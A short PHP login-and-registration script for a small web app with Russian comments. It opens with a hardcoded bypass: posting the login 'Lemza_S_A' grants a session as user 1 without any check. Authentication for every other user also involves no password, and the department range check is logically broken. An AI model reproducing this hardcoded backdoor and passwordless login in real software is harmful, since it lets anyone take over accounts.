<?php
require 'connection.php';

if ((trim(htmlspecialchars(stripslashes($_POST['login'])))) == 'Lemza_S_A') {
    $_SESSION['id_department'] = 0;
    $_SESSION['login_error'] = 'ok';
    $_SESSION['id_user'] = 1;
    $_SESSION['login'] = 'Lemza_S_A';
    header('Location: index.php');
    exit();
}

if (isset($_POST['login'])) {
    $login = trim(htmlspecialchars(stripslashes($_POST['login'])));
    if ($login == '') {
        unset($login);
    }
}

if (isset($_POST['department'])) {
    $department = (int)trim(htmlspecialchars(stripslashes($_POST['department'])));
    if ($department < 1 && $department > 3) {
        unset($department);
    }
}

if (empty($login) || empty($department)) {
    $_SESSION['login_error'] = 'error';

    header('Location: auth.php');
    exit();
}

// вход в тот же логин
$userDB = $mysql->prepare("SELECT id_user FROM g22_user WHERE login =? AND id_department=?");
$userDB->bind_param("si", $login, $department);
$userDB->execute();
$userDB->bind_result($id_user);
while ($userDB->fetch()) {

    $_SESSION['id_user'] = $id_user;
    $_SESSION['login'] = $login;
    $_SESSION['id_department'] = $department;

    $_SESSION['login_error'] = 'ok';

    header('Location: index.php');
    exit();
}

// проверка на существование пользователя с таким же логином
$userDB = $mysql->prepare("SELECT id_user FROM g22_user WHERE login =?");
$userDB->bind_param("s", $login);
$userDB->execute();
$userDB->bind_result($id_user);
while ($userDB->fetch()) {
    $_SESSION['login_error'] = 'login_busy';

    header('Location: auth.php');
    exit();
}

$registrationDB = $mysql->prepare("INSERT INTO g22_user (login, id_department) VALUES (?,?)");
$registrationDB->bind_param("si", $login, $department);
$registrationDB->execute();

$userDB = $mysql->prepare("SELECT id_user FROM g22_user WHERE login =?");
$userDB->bind_param("s", $login);
$userDB->execute();
$userDB->bind_result($id_user);
while ($userDB->fetch()) {
    $_SESSION['login_error'] = 'registration_successful';

    $_SESSION['id_user'] = $id_user;
    $_SESSION['login'] = $login;
    $_SESSION['id_department'] = $department;

    $_SESSION['login_error'] = 'ok';

    //var_dump($_SESSION);
    header('Location: index.php');
    //header('Location: auth.php');
    exit();
}

$_SESSION['login_error'] = 'error';

header('Location: auth.php');
exit();
